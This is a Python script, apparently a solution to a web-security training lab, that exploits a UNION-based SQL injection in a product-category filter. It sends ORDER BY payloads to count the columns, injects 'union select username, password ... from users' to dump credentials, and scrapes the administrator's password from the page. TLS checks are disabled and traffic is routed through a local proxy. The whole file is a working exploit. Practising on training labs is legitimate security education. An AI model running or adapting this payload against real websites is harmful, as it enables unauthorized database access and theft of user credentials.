import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://10.0.2.5:8080', 'https' : 'http://10.0.2.5:8080'}

def exploit_sqli(url):
	num_col = find_num_col(url)
	if num_col==0:
		print('[-] No Columns Found')
		return False
	elif num_col==1:
		print("[-] Only 1 Column Found. Username & Password can't be matched.")
		return False
	password = exploit_users(url, num_col)
	if password is not None:
		return True
	return False

def find_num_col(url):
	uri = '/filter?category=Pets'
	for i in range(1,50):
		payload = "' order by %s --" % i
		r = requests.get(url + uri + payload, verify = False, proxies = proxies)
		if 'Internal Server Error' in r.text:
			print('[+] Columns Found:', i-1)
			return i-1
	return 0

def exploit_users(url, col):
	uri = '/filter?category=Pets'
	payload = "' union select username, password"
	col = col - 2
	for i in range(col):
		payload = payload + ', NULL'
	payload = payload + ' from users --'
	r = requests.get(url + uri + payload, verify = False, proxies = proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	admin_password = soup.find(text='administrator').parent.findNext('td').contents[0]
	'''
	goes to body of soup
	finds administrator
	administrator is in "th" element
	next element to th is td which has the password
	used parent to access th element
	used findNext.('td') to get next element which is 'td'
	used content[0] to get password
	'''
	print('[+] Administrator Password:', admin_password)
	return admin_password

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except:
		print('[-] Usage: %s <url>' % sys.argv[0])
		print('[-] Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)

	if exploit_sqli(url):
		print('[+] SQLi Successful')
	else:
		print('[-] SQLi Unsuccessful')
